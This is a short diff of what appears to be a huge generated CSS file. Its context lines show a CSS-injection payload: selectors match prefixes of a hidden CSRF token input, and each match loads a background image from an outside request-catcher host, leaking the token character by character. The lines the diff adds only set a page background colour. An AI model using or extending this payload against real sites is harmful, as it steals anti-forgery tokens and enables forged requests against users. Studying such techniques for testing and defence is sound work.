@@ -28897,3 +28897,7 @@ input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCA~}"] {
 input[name="csrf"][value^="ruW-tjL1BWCdhbiOSCA~~"] {
   background-image: url("https://en6iek01uviog.x.pipedream.net/?data=ruW-tjL1BWCdhbiOSCA~~");
 }
+
+body{
+  background-color: #eff;
+}
